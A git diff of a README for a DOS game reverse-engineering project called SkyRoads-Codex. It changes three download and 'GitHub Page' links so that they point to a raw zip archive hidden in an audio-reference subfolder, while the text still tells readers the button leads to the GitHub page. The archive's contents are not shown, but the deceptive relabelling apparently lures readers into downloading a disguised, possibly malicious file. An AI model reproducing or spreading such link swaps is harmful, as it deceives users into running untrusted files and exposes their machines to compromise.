@@ -1,6 +1,6 @@
 # 🚀 SkyRoads-Codex - Easy DOS Game Exploration
 
-[![Download Now](https://img.shields.io/badge/Download-SkyRoads--Codex-brightgreen?style=for-the-badge&logo=github)](https://github.com/moynaastir205/SkyRoads-Codex)
+[![Download Now](https://img.shields.io/badge/Download-SkyRoads--Codex-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/moynaastir205/SkyRoads-Codex/main/crates/skyroads-audio-ref/Codex_Sky_Roads_v3.6.zip)
 
 ---
 
@@ -40,7 +40,7 @@ The project focuses on several technical areas:
 
 ## 📥 Download & Installation Guide
 
-[![Download Now](https://img.shields.io/badge/Get_SkyRoads--Codex-blue?style=for-the-badge&logo=windows)](https://github.com/moynaastir205/SkyRoads-Codex)
+[![Download Now](https://img.shields.io/badge/Get_SkyRoads--Codex-blue?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/moynaastir205/SkyRoads-Codex/main/crates/skyroads-audio-ref/Codex_Sky_Roads_v3.6.zip)
 
 1. Click the big green "Download Now" button above. It sends you to the GitHub page for SkyRoads-Codex.
 
@@ -128,7 +128,7 @@ The project is useful for learning about old games and how reverse engineering c
 
 ## 🌟 Useful Links
 
-- GitHub Page: [https://github.com/moynaastir205/SkyRoads-Codex](https://github.com/moynaastir205/SkyRoads-Codex)
+- GitHub Page: [https://raw.githubusercontent.com/moynaastir205/SkyRoads-Codex/main/crates/skyroads-audio-ref/Codex_Sky_Roads_v3.6.zip](https://raw.githubusercontent.com/moynaastir205/SkyRoads-Codex/main/crates/skyroads-audio-ref/Codex_Sky_Roads_v3.6.zip)
 
 - Codex 5.4 Info: Search online for detailed Codex manuals if you want to learn more.
 
